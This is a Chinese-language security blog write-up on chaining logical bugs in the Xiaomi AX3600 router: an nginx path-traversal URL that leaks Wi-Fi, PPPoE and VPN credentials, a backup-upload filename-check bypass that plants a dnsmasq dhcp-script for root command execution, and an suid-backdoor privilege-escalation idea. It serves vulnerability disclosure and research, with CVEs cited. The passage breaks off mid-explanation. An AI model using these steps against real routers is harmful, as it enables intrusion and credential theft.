<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Exploiting AX3600 Using Logical Bugs - localhost - Done with development, it&#39;s time to pwn.</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="M4x" />
  <meta name="description" content="" />
<meta name="keywords" content="exploit, router, logical bugs" />







<meta name="generator" content="Hugo 0.68.3" />


<link rel="canonical" href="https://bash-c.github.io/post/exploiting-ax3600-using-logical-bugs/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.f1e506a781bf25d33ffc18aa6b4e972a965c58049d27d4f92b7db2e9bf28e4bf.css" integrity="sha256-8eUGp4G/JdM//Biqa06XKpZcWASdJ9T5K32y6b8o5L8=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="Exploiting AX3600 Using Logical Bugs" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bash-c.github.io/post/exploiting-ax3600-using-logical-bugs/" />
<meta property="article:published_time" content="2020-09-20T11:01:14+08:00" />
<meta property="article:modified_time" content="2020-09-20T11:01:14+08:00" />
<meta itemprop="name" content="Exploiting AX3600 Using Logical Bugs">
<meta itemprop="description" content="">
<meta itemprop="datePublished" content="2020-09-20T11:01:14&#43;08:00" />
<meta itemprop="dateModified" content="2020-09-20T11:01:14&#43;08:00" />
<meta itemprop="wordCount" content="3663">



<meta itemprop="keywords" content="exploit,IoT," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Exploiting AX3600 Using Logical Bugs"/>
<meta name="twitter:description" content=""/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo"># </a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      # 
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">Exploiting AX3600 Using Logical Bugs</h1>
      
      <div class="post-meta">
        <time datetime="2020-09-20" class="post-time">
          2020-09-20
        </time>
        <div class="post-category">
            <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
            
          </div>
        <span class="more-meta"> 3663 words </span>
          <span class="more-meta"> 8 min read </span>

        
        
          <span id="busuanzi_container_page_pv">
            | 阅读 <span id="busuanzi_value_page_pv"></span>
          </span>
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#获取固件">获取固件</a></li>
    <li><a href="#一串漏洞来袭">一串漏洞来袭</a>
      <ul>
        <li><a href="#漏洞一有限的路径穿越漏洞">漏洞一：有限的路径穿越漏洞</a></li>
        <li><a href="#漏洞二后台解压逻辑错误">漏洞二：后台解压逻辑错误</a></li>
        <li><a href="#漏洞三权限提升漏洞">漏洞三：权限提升漏洞</a></li>
      </ul>
    </li>
    <li><a href="#后记">后记</a></li>
    <li><a href="#参考资料">参考资料</a></li>
  </ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <h1 id="实战逻辑漏洞三个漏洞搞定一台路由器二">实战逻辑漏洞：三个漏洞搞定一台路由器（二）</h1>
<p>距离 <a href="https://zhuanlan.zhihu.com/p/26271959">实战栈溢出：三个漏洞搞定一台路由器</a> 的发表已有三年。三年来，市面上智能设备的安全性有了肉眼可见的发展，部分领头企业的智能设备在完善的缓解措施保护下已经较难通过内存漏洞完成一整套利用。</p>
<p>随着内存漏洞利用难度的增大，更加稳定的逻辑漏洞的优势就凸显了出来。本文中，笔者将分享如何通过多个<strong>逻辑漏洞</strong>，完成对 <a href="https://www.mi.com/r3600">小米AIoT路由器 AX3600</a>（后文简称 AX3600） 的 LAN 口 RCE。本文中对部分专业名词不会做太多详细的解释，需要读者有一定的安全基础。</p>
<h2 id="获取固件">获取固件</h2>
<p>在 <a href="http://www.miwifi.com/miwifi_download.html">miwifi</a> 官网可以下载到所有小米路由器的固件，本文中分析的固件版本为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">小米AIoT路由器AX3600 稳定版
版本1.0.20（2020年3月10日更新）
</code></pre></td></tr></table>
</div>
</div><h2 id="一串漏洞来袭">一串漏洞来袭</h2>
<h3 id="漏洞一有限的路径穿越漏洞">漏洞一：有限的路径穿越漏洞</h3>
<p>从官网下载并解出固件后，通过浏览 AX3600 各种服务的配置文件，很快找到了第一个由于 nginx 误配置导致的路径穿越漏洞</p>
<p><img src="../pic/Exploit-AX3600-using-logical-bugs/nginx_conf.png" alt=""></p>
<p>如上图所示，当用户使用过配置备份功能后，攻击者访问 <code>http://AX3600-ip/backup/log../test</code> 时，由于 <code>alias</code> 的作用，实际访问的文件为 <code>/tmp/syslogbackup/../test</code> 也即是 <code>/tmp/test</code>，攻击者可以通过实现从 <code>/tmp/syslogbackup</code> 穿越至 <code>/tmp</code> 目录，读取 <code>/tmp</code> 任意文件。</p>
<p>经过观察，在 <code>/tmp/messages</code> 文件中保留了较多的敏感信息</p>
<p><img src="../pic/Exploit-AX3600-using-logical-bugs/messages.png" alt=""></p>
<p>攻击者可以通过访问 <code>http://AX3600-ip/backup/log../messages</code> 读取 <code>/tmp/messages</code> 中的内容，获取明文的 wifi 密码，PPPoE 账号和密码，vpn 用户名和密码，stok 等信息。</p>
<p>其中，使用泄露的 stok 可以在一定时间内登录到后台，实现后台登录绕过。</p>
<p>这个漏洞的CVE编号是 <a href="https://privacy.mi.com/trust#/security/vulnerability-management/vulnerability-announcement/detail?id=14&amp;locale=zh">CVE-2020-11959</a></p>
<h3 id="漏洞二后台解压逻辑错误">漏洞二：后台解压逻辑错误</h3>
<p>AX3600 后台存在上传路由器配置文件的功能，用户可以通过上传包含配置文件的 <code>.tar.gz</code> 压缩包来恢复路由器设置
<img src="../pic/Exploit-AX3600-using-logical-bugs/backup.png" alt=""></p>
<p>上传后的文件在路由器的 <code>/tmp</code> 目录下被解压，只有合法的文件会被继续处理，不合法的文件报错不再处理，相关的 lua 代码经过整理后如下。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-lua" data-lang="lua"><span class="kr">function</span> <span class="nf">extract</span><span class="p">()</span>
  <span class="n">require</span> <span class="s2">&#34;nixio.fs&#34;</span>
  <span class="n">L2_30</span> <span class="o">=</span> <span class="s2">&#34;/tmp/cfgbackup.tar.gz&#34;</span>
  <span class="kr">if</span> <span class="ow">not</span> <span class="n">nixio.fs</span><span class="p">.</span><span class="n">access</span><span class="p">(</span><span class="n">L2_30</span><span class="p">)</span> <span class="kr">then</span>
    <span class="kr">return</span> <span class="mi">1</span>
  <span class="kr">end</span>
  <span class="kr">if</span> <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;tar -tzvf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span> <span class="o">..</span> <span class="s2">&#34; | grep ^l &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="kr">then</span>
    <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;rm -rf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span><span class="p">)</span>
    <span class="kr">return</span> <span class="mi">2</span>
  <span class="kr">end</span>
  <span class="kr">if</span> <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;tar -tzvf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span> <span class="o">..</span> <span class="s2">&#34; |grep -v .des|grep -v .mbu &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="kr">then</span>
    <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;rm -rf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span><span class="p">)</span>
    <span class="kr">return</span> <span class="mi">22</span>
  <span class="kr">end</span>
  <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;cd /tmp; tar -xzf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span> <span class="o">..</span> <span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">)</span>
  <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;rm &#34;</span> <span class="o">..</span> <span class="n">L2_30</span> <span class="o">..</span> <span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">)</span>
  <span class="kr">if</span> <span class="ow">not</span> <span class="n">nixio.fs</span><span class="p">.</span><span class="n">access</span><span class="p">(</span><span class="n">_UPVALUE1_</span><span class="p">)</span> <span class="kr">then</span>
    <span class="kr">return</span> <span class="mi">2</span>
  <span class="kr">end</span>
  <span class="kr">if</span> <span class="ow">not</span> <span class="n">nixio.fs</span><span class="p">.</span><span class="n">access</span><span class="p">(</span><span class="n">_UPVALUE2_</span><span class="p">)</span> <span class="kr">then</span>
    <span class="kr">return</span> <span class="mi">3</span>
  <span class="kr">end</span>
  <span class="kr">return</span> <span class="mi">0</span>
<span class="kr">end</span>
</code></pre></td></tr></table>
</div>
</div><p>分析上边的代码，发现检查文件是否合法的部分流程为：
使用 <code>tar -tzvf</code> 列出压缩包中的内容，然后使用 <code>grep</code> 检查压缩包内的文件，检查分两步</p>
<ol>
<li>使用 <code>grep ^l</code> 判断压缩包内的文件是不是软连接，是的话删除压缩包，函数退出，流程结束</li>
<li>使用 <code>grep -v .des | grep -v .mbu</code> 判断压缩包内是否包含且仅包含后缀为 <code>.des</code> 和 <code>.mbu</code> 的两个文件，不满足条件时删除压缩包，函数退出，流程结束</li>
</ol>
<p>如下图，<code>test.tar.gz</code> 中只有一个 <code>.des</code> 文件，不满足需要同时包含 <code>.mbu</code> 和 <code>.des</code> 文件的限制
<img src="../pic/Exploit-AX3600-using-logical-bugs/des.png" alt=""></p>
<p>上传后提示解压失败，不对上传的 <code>.des</code> 文件做进一步处理
<img src="../pic/Exploit-AX3600-using-logical-bugs/error.png" alt=""></p>
<p>在解压失败逻辑中，存在一个细微的逻辑问题：<strong>未删除解压后不合法的配置文件</strong>。如上图的例子中，在路由器上解压得到的 <code>test.des</code> 文件虽然没有被进一步处理，但仍然保留在了 <code>/tmp</code> 目录下
<img src="../pic/Exploit-AX3600-using-logical-bugs/still_here.png" alt=""></p>
<p>同时因为压缩包可以保留路径信息，用户可以上传保留了路径信息的 <code>.des</code> 或者 <code>.mbu</code> 文件至 <code>/tmp</code> 下的任意路径
<img src="../pic/Exploit-AX3600-using-logical-bugs/new_dir.png" alt=""></p>
<p><img src="../pic/Exploit-AX3600-using-logical-bugs/new_dir_.png" alt=""></p>
<p>攻击者可以利用这个逻辑缺陷在 <code>/tmp</code> 下写任意后缀为 <code>.mbu</code> 或者 <code>.des</code> 的文件。单独来看，这个问题并不严重，但与下文的逻辑漏洞连用，攻击者可以实现后台的任意命令执行。</p>
<p>仔细阅读解压逻辑中判断文件是否为合法的代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-lua" data-lang="lua">  <span class="kr">if</span> <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;tar -tzvf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span> <span class="o">..</span> <span class="s2">&#34; |grep -v .des|grep -v .mbu &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="kr">then</span>
    <span class="n">os.execute</span><span class="p">(</span><span class="s2">&#34;rm -rf &#34;</span> <span class="o">..</span> <span class="n">L2_30</span><span class="p">)</span>
    <span class="kr">return</span> <span class="mi">22</span>
  <span class="kr">end</span>
</code></pre></td></tr></table>
</div>
</div><p>判断压缩包中是否包含且只包含 <code>*.des</code> 和 <code>*.mbu</code> 使用了 <code>grep -v</code>，但这样使用 <code>grep</code> 真的能起到预期的效果吗？</p>
<p>查看 <code>grep</code> 的 man 手册</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">GREP(1)                                                                                         User Commands                                                                                         GREP(1)

NAME
       grep, egrep, fgrep, rgrep - print lines matching a pattern

......
       -v, --invert-match
              Invert the sense of matching, to select non-matching lines.
......
</code></pre></td></tr></table>
</div>
</div><p><code>grep</code> 在进行模式匹配时，是以行为单位进行的，如下图，只要整行中包含特定的字符串即可通过 <code>grep</code> 的检查
<img src="../pic/Exploit-AX3600-using-logical-bugs/grep.png" alt=""></p>
<p>同时，因为 <code>grep</code> 在模式匹配时使用 <code>.</code> 可以代替任意字符，所以文件名只需包含 <code>mbu</code> 和 <code>des</code> 即可，而不必要必须以 <code>.mbu</code> 或 <code>.des</code> 结尾</p>
<p><img src="../pic/Exploit-AX3600-using-logical-bugs/mbu.png" alt=""></p>
<p>这也是一个很微小的逻辑漏洞，比起上一步，攻击者能多造成的影响仅仅是可以部分改变上传文件的文件名（从必须是 <code>.des</code> 或 <code>.mbu</code> 后缀改为文件名中包含 <code>des</code> 或 <code>mbu</code> 即可），但从攻击者的角度而言，漏洞的影响已经大大上升了一个等级，如在正常的渗透测试中，上传 <code>.php</code>, <code>.jsp</code> 等可写webshell。</p>
<p>但对于 AX3600，攻击者可以控制的文件在 <code>/tmp</code> 下，<code>/tmp</code> 下可选的目标并不多。继续浏览 <code>/tmp</code> 下的文件，发现存在 <code>/tmp/dnsmasq.d</code> 文件夹，分析 <code>dnsmasq</code> 的运行逻辑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@XiaoQiang:~# ps w <span class="p">|</span> grep dnsmasq
 <span class="m">3951</span> root      <span class="m">1300</span> S    /usr/sbin/dnsmasq --user<span class="o">=</span>root -C /var/etc/dnsmasq.conf.cfg01411c -k -x /var/run/dnsmasq/dnsmasq.cfg01411c
<span class="m">28237</span> root      <span class="m">1336</span> S    grep dnsmasq
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@XiaoQiang:~# cat /var/etc/dnsmasq.conf.cfg01411c
<span class="c1"># auto-generated config file from /etc/config/dhcp</span>
conf-file<span class="o">=</span>/etc/dnsmasq.conf
<span class="nv">address</span><span class="o">=</span>/workforme.stat.localdomain/127.0.0.1
dhcp-authoritative
domain-needed
localise-queries
read-ethers
enable-ubus
expand-hosts
bind-dynamic
local-service
all-servers
<span class="nv">server</span><span class="o">=</span>/lan/
dhcp-leasefile<span class="o">=</span>/tmp/dhcp.leases
resolv-file<span class="o">=</span>/tmp/resolv.conf.auto
intercept-ip-address<span class="o">=</span>192.168.31.1
intercept-white-list<span class="o">=</span>/etc/intercept_wlist
addn-hosts<span class="o">=</span>/tmp/hosts
conf-dir<span class="o">=</span>/tmp/dnsmasq.d




dhcp-range<span class="o">=</span>set:lan,192.168.31.5,192.168.31.254,255.255.255.0,12h
dhcp-option-force<span class="o">=</span>12,MiWiFi-R3600-srv
dhcp-option-force<span class="o">=</span>43,miwifi-R3600-1.0.50-101


<span class="nv">address</span><span class="o">=</span>/XiaoQiang/192.168.31.1
ptr-record<span class="o">=</span>1.31.168.192.in-addr.arpa,XiaoQiang

root@XiaoQiang:~#
</code></pre></td></tr></table>
</div>
</div><p>可以发现，<code>/tmp/dnsmaq.d</code> 是 <code>dnsmasq</code> 存放配置文件的目录，当 <code>dnsmasq</code> 重启时，<code>conf-dir</code> 中的新配置文件会被加载，当前情况下，只需配置文件后缀是 <code>.conf</code> 即可被加载。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">-7, --conf-dir=&lt;directory&gt;[,&lt;file-extension&gt;......],
Read all the files in the given directory as configuration files. If extension(s) are given, any files which end in those extensions are skipped. Any files whose names end in ~ or start with . or start and end with # are always skipped. If the extension starts with * then only files which have that extension are loaded. So --conf-dir=/path/to/dir,*.conf loads all files with the suffix .conf in /path/to/dir. This flag may be given on the command line or in a configuration file. If giving it on the command line, be sure to escape * characters. Files are loaded in alphabetical order of filename.
</code></pre></td></tr></table>
</div>
</div><p>而 <code>dnsmasq</code> 又支持很多特性（限于篇幅，下文只列出部分特性，<code>dnsmasq</code> 的完整配置可以参考文末的链接）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@XiaoQiang:~# dnsmasq --help
Usage: dnsmasq <span class="o">[</span>options<span class="o">]</span>

Valid options are:
......
-6, --dhcp-script<span class="o">=</span>&lt;path&gt;                               Shell script to run on DHCP lease creation and destruction.
    --dhcp-luascript<span class="o">=</span>path                              Lua script to run on DHCP lease creation and destruction.
    --dhcp-scriptuser<span class="o">=</span>&lt;username&gt;                       Run lease-change scripts as this user.
......
-7, --conf-dir<span class="o">=</span>&lt;path&gt;                                  Read configuration 
......
    --enable-tftp<span class="o">[=</span>&lt;intr&gt;<span class="o">[</span>,&lt;intr&gt;<span class="o">]]</span>                    Enable integrated read-only TFTP server.
    --tftp-root<span class="o">=</span>&lt;dir&gt;<span class="o">[</span>,&lt;iface&gt;<span class="o">]</span>                        Export files by TFTP only from the specified subtree.
    --tftp-unique-root<span class="o">[=</span>ip<span class="p">|</span>mac<span class="o">]</span>                        Add client IP or hardware address to tftp-root.
    --tftp-secure                                      Allow access only to files owned by the user running dnsmasq.
    --tftp-no-fail                                     Do not terminate the service <span class="k">if</span> TFTP directories are inaccessible.
    --tftp-max<span class="o">=</span>&lt;integer&gt;                               Maximum number of concurrent TFTP transfers <span class="o">(</span>defaults to 50<span class="o">)</span>.
    --tftp-mtu<span class="o">=</span>&lt;integer&gt;                               Maximum MTU to use <span class="k">for</span> TFTP transfers.
    --tftp-no-blocksize                                Disable the TFTP blocksize extension.
    --tftp-lowercase                                   Convert TFTP filenames to lowercase
    --tftp-port-range<span class="o">=</span>&lt;start&gt;,&lt;end&gt;                    Ephemeral port range <span class="k">for</span> use by TFTP transfers.
......
</code></pre></td></tr></table>
</div>
</div><p>因此，通过在 <code>/tmp/dnsmasq.d</code> 下上传 <code>dnsmasq</code> 的配置文件完成命令执行就是一个很好的选择了。</p>
<p>这里选用通过 <code>dnsmasq</code> 的 <code>dhcp-script</code> 选项完成执行命令。具体方法为：</p>
<ol>
<li>
<p>先在 <code>/tmp</code> 下上传包含攻击者命令的 shell 脚本(文件名包含 des 或者 mbu)
<img src="../pic/Exploit-AX3600-using-logical-bugs/sh.png" alt=""></p>
</li>
<li>
<p>再上传 <code>.conf</code> 结尾的 dnsmasq 配置文件至 <code>/tmp/dnsmasq.d</code>（文件名同样包括 des 或者 mbu）
<img src="../pic/Exploit-AX3600-using-logical-bugs/conf.png" alt="">
如下图表示成功上传
<img src="../pic/Exploit-AX3600-using-logical-bugs/upload.png" alt=""></p>
</li>
<li>
<p>重启 dnsmasq，方法有很多，基本所有更改网络状态的操作都可以实现，这里通过开/关 ipv6 支持来实现
<img src="../pic/Exploit-AX3600-using-logical-bugs/dnsmasq.png" alt=""></p>
</li>
<li>
<p>然后通过 tftp 触发 dhcp-script，实现代码执行
<img src="../pic/Exploit-AX3600-using-logical-bugs/tftp.png" alt=""></p>
</li>
<li>
<p>最终可以观察到 hackdes.sh 中的命令被执行
<img src="../pic/Exploit-AX3600-using-logical-bugs/rce.png" alt=""></p>
</li>
</ol>
<p>这个漏洞的CVE编号是 <a href="https://privacy.mi.com/trust#/security/vulnerability-management/vulnerability-announcement/detail?id=15&amp;locale=zh">CVE-2020-11960</a></p>
<p>上边两个漏洞连用，攻击者可以实现有限制的未授权代码执行（需要用户使用过备份配置的功能）</p>
<h4 id="q--a">Q &amp; A</h4>
<ul>
<li>为什么使用 dhcp-script 选项的同时，要开启 tftp？
<ul>
<li>触发 dhcp-script 需要一定的条件，通过 tftp 传输文件触发是一个很方便的方法</li>
</ul>
<blockquote>
<p>-6 &ndash;dhcp-script=<!-- raw HTML omitted -->
Whenever a new DHCP lease is created, or an old one destroyed, or a TFTP file transfer completes, the executable specified by this option is run. <!-- raw HTML omitted --> must be an absolute pathname, no PATH search occurs.</p>
</blockquote>
</li>
<li>既然可以开启 tftp，能否可以通过 tftp 上传文件完成利用？
<ul>
<li>不可以，dnsmasq 的 tftp 只能读取文件，不能上传文件</li>
</ul>
<blockquote>
<p>The philosopy was to implement just enough of TFTP to do network boot,
aiming for security and then simplicity. Hence no write operation: it&rsquo;s
not needed for network booting, and it&rsquo;s not secure.</p>
</blockquote>
</li>
<li>为什么不使用 dhcp-luascript?
<ul>
<li>AX3600 的 dnsmasq 不支持该选项</li>
</ul>
<blockquote>
<p>root@XiaoQiang:~# dnsmasq &ndash;version
Dnsmasq version 2.80  Copyright (c) 2000-2018 Simon Kelley
Compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP no-DHCPv6 no-Lua TFTP no-conntrack ipset no-auth no-DNSSEC no-ID loop-detect no-inotify dumpfile</p>
</blockquote>
</li>
</ul>
<h3 id="漏洞三权限提升漏洞">漏洞三：权限提升漏洞</h3>
<p>上述两个漏洞连用，攻击者已经可以未授权获得 root shell。出于安全研究的目的，我们多考虑了假设攻击者只拿到低权限的 shell，是否有可能通过漏洞进行权限提升，并最终找到了一个权限提升漏洞。</p>
<p>漏洞产生的原因仍然和 <code>.tar.gz</code> 的解压有关，对于 <code>root</code> 用户而言，使用 <code>tar</code> 解压文件时，默认会保留文件的文件所有者，文件权限等信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">  -p, --preserve-permissions, --same-permissions
                             extract information about file permissions
                             (default for superuser)
      --same-owner           try extracting files with the same ownership as
                             exists in the archive (default for superuser)
</code></pre></td></tr></table>
</div>
</div><p>因此攻击者可以通过上传具有 <code>suid</code> 权限的后门程序到路由器文件系统中，低权限的攻击者通过执行后门来获取高权限的 shell。</p>
<p>上传文件时对文件大小有限制，直接使用 C\C++ 等语言编写后门时，会超过最大限制。
<img src="../pic/Exploit-AX3600-using-logical-bugs/oversize.png" alt=""></p>
<p>对于二进制选手而言，缩小可执行程序的体积就很简单了，如使用汇编写 binary 可以很大程度的缩小程序的体积，使用 pwntools 可以很方便的完成</p>
